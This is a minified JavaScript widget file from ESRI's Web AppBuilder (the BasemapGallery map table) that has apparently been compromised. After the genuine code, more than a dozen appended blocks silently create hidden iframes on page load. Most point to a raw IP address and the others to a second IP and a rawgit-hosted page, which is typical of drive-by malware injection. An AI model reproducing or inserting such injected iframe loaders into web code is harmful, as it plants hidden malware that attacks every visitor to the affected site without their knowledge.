// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/BasemapGallery/setting/MapTable.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"maps-section" data-dojo-attach-point\x3d"allMapsSection"\x3e\r\n\t\t\x3cdiv class\x3d"maps-table-div" data-dojo-attach-point\x3d"allMapsTableDiv"\x3e\r\n\t\t\t\x3cdiv class\x3d"maps-table" cellpadding\x3d"10" data-dojo-attach-point\x3d"allMapsTable"\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"search-none-tip-section hidden" data-dojo-attach-point\x3d"searchNoneTipSection"\x3e\r\n\t\t\t\x3cdiv class\x3d"no-basemaptip"\x3e${nls.noBasemaps}\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"search-none-tip"\x3e${nls.noBasemapAvailable}\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-attach-point\x3d"allMapsShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./MapTable.html dojo/Evented dojo/_base/lang dojo/_base/array dojo/_base/html dojo/Deferred dojo/promise/all dojo/query dojo/on esri/request jimu/utils jimu/portalUtils jimu/portalUrlUtils jimu/dijit/LoadingIndicator ../BasemapItem ../utils".split(" "),function(l,m,n,p,q,r,c,e,b,g,h,w,t,x,y,u,v,z,d,k){return l([m,n,p,r],{templateString:q,baseClass:"basemap-table",query:null,portalUrl:null,nls:null,
type:"",multiple:!1,map:null,spatialReference:null,basemaps:[],postMixInProperties:function(){this.nls=c.mixin(this.nls,window.jimuNls.itemSelector)},postCreate:function(){this.inherited(arguments);this.basemaps=[];this.portalUrl&&(this.portalUrl=v.getStandardPortalUrl(this.portalUrl));this.search()},search:function(a){a&&(this.query=c.clone(a),this.clear());this.portalUrl&&this.query&&(a=u.getPortal(this.portalUrl),this.allMapsShelter.show(),b.addClass(this.searchNoneTipSection,"hidden"),a.queryItems(this.query).then(c.hitch(this,
function(a){this._createMapItems(a).then(c.hitch(this,function(){this.allMapsShelter.hide();this._filterMapCallback()}))}),c.hitch(this,function(a){console.error(a);this.domNode&&(this.allMapsShelter.hide(),this._filterMapCallback())})))},_filterMapCallback:function(){0<this.basemaps.length?(b.removeClass(this.allMapsTableDiv,"hidden"),b.addClass(this.searchNoneTipSection,"hidden")):(b.addClass(this.allMapsTableDiv,"hidden"),b.removeClass(this.searchNoneTipSection,"hidden"))},clear:function(){this.basemaps=
[];b.empty(this.allMapsTable)},_createMapItems:function(a){var b=[],d=[],f=new g;a=e.filter(a.results,c.hitch(this,function(a){return a.type.toLowerCase()===this.type.toLowerCase()}));if(0===a.length)return f.resolve(),f;e.forEach(a,function(a){b.push(k.getBasemapInfo(a.portalUrl,a.id))});h(b).then(c.hitch(this,function(a){e.forEach(a,c.hitch(this,function(a){var b=new g;k.isBasemapCompatibleWithMap(a.spatialReference,a.layers,this.map).then(c.hitch(this,function(c){c&&this._createMapItem(a);b.resolve()}));
d.push(b)}));h(d).then(function(){f.resolve()})}));return f},_createMapItem:function(a){a=new d({appConfig:this.appConfig,basemap:a,folderUrl:this.folderUrl,spatialReference:this.spatialReference,nls:this.nls,mode:d.MODE_SELECT});this.basemaps.push(a);0===this.basemaps.length%4&&b.addClass(a.domNode,"no-margin");b.place(a.domNode,this.allMapsTable);this.own(t(a,"selected",c.hitch(this,function(a){this.emit("selectionChange")})))},getSelectedMapItems:function(){return e.filter(this.basemaps,function(a){return a.isSelected()})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});